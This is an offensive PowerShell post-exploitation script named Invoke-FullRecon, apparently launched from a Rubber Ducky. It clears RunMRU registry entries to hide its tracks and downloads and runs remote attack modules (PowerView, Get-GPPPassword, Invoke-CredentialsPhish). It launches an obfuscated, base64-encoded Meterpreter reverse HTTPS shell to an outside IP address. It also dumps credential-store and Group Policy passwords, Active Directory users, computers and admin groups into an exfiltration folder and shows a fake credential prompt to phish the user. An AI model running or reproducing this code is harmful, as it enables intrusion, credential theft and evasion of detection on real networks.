<# 
    1.  Remove entry from Run Box
    2.  Create Shell
3.  If shell created, make it persistent
    4.  Look for logged on Admins multithreaded
    5.  Dump credstore passwords
    6.  Dump all AD users with all properties
    7.  Dump all AD computers with all properties
8.  Dump all users that do not require a password
9.  Look for LAPS passwords
    10. Dump domain admins
    11. Dump local admins
    12. Dump Enterprise Admins
13. Dump all DNS A and Cname records
14. Dump local proxy settings
15. Look for open file shares and search for password files (get-dfsShare; Get-NetFileServer; Invoke-ShareFinder)
    16. Look for passwords in GPP
17. Get ACL's for all security Groups in AD in preparation for looking for privilege escalation path
18. Dump all OU's in Domain
19. Dump all registered subnets in domain
    20. Search for exploitable systems (Get-ExploitableSystem)
21. Start Keylogger with upload once per hour
22. Look for open SMTP servers
    23. Phish for Credentials (https://raw.githubusercontent.com/ericshoemaker/nishang/master/Gather/Invoke-CredentialsPhish.ps1)
#>

Function Invoke-FullRecon
{
param(
    $InvokeShell=$true
    )


# DELETE RUN ENTRIES TO COVER TRACKS IN CASE RUBBER DUCKY WAS USED TO KICK OFF SCRIPT
Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

# CREATE FOLDER IN DOWNLOADS TO STORE CSV FILES FOR EXFILTRATION
$ExfilPath="$env:USERPROFILE\downloads\Exfil"
mkdir $ExfilPath

# ADDING POWERSPLOIT, POWERVIEW, AND SHELLCODE SCRIPT MODULES

iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerSploit/master/Recon/PowerView.ps1'))

# CREATE METERPRETER SHELL BACK TO LISTENER HOST IF DESIRED
If ($InvokeShell -eq $true){
    $i=0
    While ($i -lt 5){
    Start-Job -ScriptBlock {powershell -windowstyle hidden -Noninteractive -noexit -executionpolicy bypass -encodedcommand aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBlAHIAaQBjAHMAaABvAGUAbQBhAGsAZQByAC8ASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAtAE0AZQB0AC8AbQBhAHMAdABlAHIALwBJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApACkAOwBpAG4AdgBvAGsAZQAtAHMAaABlAGwAbABjAG8AZABlACAALQBwAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADMAOAAuADEAMgA5AC4AOQA2AC4ANQA0ACAALQBMAHAAbwByAHQAIAA4ADQANAAzACAALQBmAG8AcgBjAGUA}
    $i++
    }
    # NEED TO ADD PERSISTENCE
    }

# LOOK FOR LOGGED ON ADMINS MULTI-THREADED
Invoke-UserHunter -Threads 20 -CheckAccess | Export-CSV -Path $ExfilPath\LoggedOnAdmins.csv -NoTypeInformation
    
# DUMPING CREDENTIAL STORE PASSWORDS
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/CredentialStore/master/Get-CredStoreCredentials.ps1')) | Export-Csv -Path $ExfilPath\CredStore.csv -NoTypeInformation

# DUMPING ALL AD USERS WITH ALL PROPERTIES
Get-NetUser | Export-CSV -Path $ExfilPath\ADUsers.csv -NoTypeInformation 

# DUMPING ALL AD COMPUTERS WITH ALL PROPERTIES
Get-NetComputer | Export-CSV -Path $ExfilPath\ADComputers.csv -NoTypeInformation

# DUMPING ALL USERS THAT DO NOT REQUIRE A PASSWORD (Needs Research)

# DUMPING ALL AD GROUP INFORMATION AND MEMBERSHIPS
Get-NetGroup "Domain Admins" | Get-NetGroupMember -Recurse | Export-CSV -Path $ExfilPath\Groups-DomainAdmins.csv -NoTypeInformation
Get-NetGroup "Enterprise Admins" | Get-NetGroupMember -Recurse | Export-CSV -Path $ExfilPath\Groups-EnterpriseAdmins.csv -NoTypeInformation
$Groups=Get-NetGroup -FullData 
$Groups | Export-CSV -Path $ExfilPath\Groups-AllGroups.csv -NoTypeInformation
$AllGroupMembers=@()
Foreach ($Group in $Groups){$AllGroupMembers += Get-NetGroup -GroupName $Group.samaccountname}
$AllGroupMembers | Export-CSV -Path $ExfilPath\Groups-AllGroupMemberships.csv -NoTypeInformation


# SEARCH FOR EXPLOITABLE SYSTEMS
Get-ExploitableSystem | Export-CSV -Path $ExfilPath\ExploitableSystems.csv -NoTypeInformation

# GET GROUP POLICY PASSWORDS
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')) 
Get-GPPPassword | Export-Csv -Path $ExfilPath\GPPPaswords.csv -NoTypeInformation




















# JUST FOR FUN, PHISH FOR CREDENTIALS LOCALLY
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/nishang/master/Gather/Invoke-CredentialsPhish.ps1')) 
$CredPhish=Invoke-CredentialsPhish 
$CredPhish | Out-File $ExfilPath\CredPhish.txt

}

